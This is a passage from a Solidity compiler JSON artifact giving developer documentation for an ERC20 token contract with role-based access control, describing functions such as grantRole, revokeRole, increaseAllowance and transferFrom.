      "decreaseAllowance(address,uint256)": {
        "details": "Atomically decreases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
      },
      "getRoleAdmin(bytes32)": {
        "details": "Returns the admin role that controls `role`. See {grantRole} and {revokeRole}. To change a role's admin, use {_setRoleAdmin}."
      },
      "grantRole(bytes32,address)": {
        "details": "Grants `role` to `account`. If `account` had not been already granted `role`, emits a {RoleGranted} event. Requirements: - the caller must have ``role``'s admin role."
      },
      "hasRole(bytes32,address)": {
        "details": "Returns `true` if `account` has been granted `role`."
      },
      "increaseAllowance(address,uint256)": {
        "details": "Atomically increases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address."
      },
      "name()": {
        "details": "Returns the name of the token."
      },
      "renounceRole(bytes32,address)": {
        "details": "Revokes `role` from the calling account. Roles are often managed via {grantRole} and {revokeRole}: this function's purpose is to provide a mechanism for accounts to lose their privileges if they are compromised (such as when a trusted device is misplaced). If the calling account had been revoked `role`, emits a {RoleRevoked} event. Requirements: - the caller must be `account`."
      },
      "revokeRole(bytes32,address)": {
        "details": "Revokes `role` from `account`. If `account` had been granted `role`, emits a {RoleRevoked} event. Requirements: - the caller must have ``role``'s admin role."
      },
      "supportsInterface(bytes4)": {
        "details": "See {IERC165-supportsInterface}."
      },
      "symbol()": {
        "details": "Returns the symbol of the token, usually a shorter version of the name."
      },
      "totalSupply()": {
        "details": "See {IERC20-totalSupply}."
      },
      "transfer(address,uint256)": {
        "details": "See {IERC20-transfer}. Requirements: - `recipient` cannot be the zero address. - the caller must have a balance of at least `amount`."
      },
      "transferFrom(address,address,uint256)": {
        "details": "See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `amount`. - the caller must have allowance for ``sender``'s tokens of at least `amount`."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}